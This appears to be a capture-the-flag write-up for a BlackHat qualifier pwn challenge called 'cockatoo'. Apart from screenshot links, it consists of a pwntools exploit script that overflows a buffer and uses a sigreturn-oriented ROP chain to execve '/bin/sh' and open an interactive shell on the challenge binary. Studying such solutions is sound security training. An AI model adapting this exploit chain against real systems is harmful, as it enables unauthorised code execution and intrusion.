---
title: BlackHat Qualifier cockatoo
author: megachar0x01
date: 2024-10-27
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag


<img src="https://i.imgur.com/gRMea2s.png" alt="img_1">

<img src="https://i.imgur.com/fsnGpN1.png" alt="img_2">

<img src="https://i.imgur.com/KOuyEND.png" alt="img_3">


```python
#!/usr/bin/python3

from pwn import *
import struct
from ctypes import *
import subprocess
  
context.terminal = ['tmux','splitw']

os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'ERROR'

# Allows you to switch between local/GDB/remote from terminal

def start(argv=[], *a, **kw):

    if args.GDB: # Set GDBscript below

        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)

    elif args.REMOTE: # ('server', 'port')

        return remote(sys.argv[1], sys.argv[2], *a, **kw)

    else: # Run locally

        return process([exe] + argv, *a, **kw)

  
  

# Specify GDB script here (breakpoints etc)

gdbscript = '''

break *main+209


continue
'''.format(**locals())

#exe = '/challenge/babyrop_level10.1'; elf = context.binary = ELF(exe)
exe = './bin'; elf = context.binary = ELF(exe)
libc = elf.libc 
c = constants

exe_rop = ROP(elf,checksec=False)

io = start()

payload = b""
payload += b"\x50"*0x100+b"\x17"
payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])
payload += p64(15) #SYS_Sigreturn
payload += p64(exe_rop.find_gadget([ 'syscall' ])[0])

frame = SigreturnFrame()

frame.rax = constants.SYS_execve 
frame.rdi = 0x45
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404900
frame.rip = elf.sym.main #exe_rop.find_gadget([ 'syscall' ])[0]

payload += bytes(frame)

io.sendline(payload)


sleep(1)

payload = b"\x00\x00/bin/sh\x00"
payload += b"\x50"*(0x100-len(payload))
payload += b"\x17"
payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])
payload += p64(15) #SYS_Sigreturn
payload += p64(exe_rop.find_gadget([ 'syscall' ])[0])
frame = SigreturnFrame()

frame.rax = constants.SYS_execve 
frame.rdi = 0x4047ea
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x403050
frame.rip = exe_rop.find_gadget([ 'syscall' ])[0]

payload += bytes(frame)


io.sendline(payload)
print(f"payload 2 :: {payload}")


io.interactive()

```
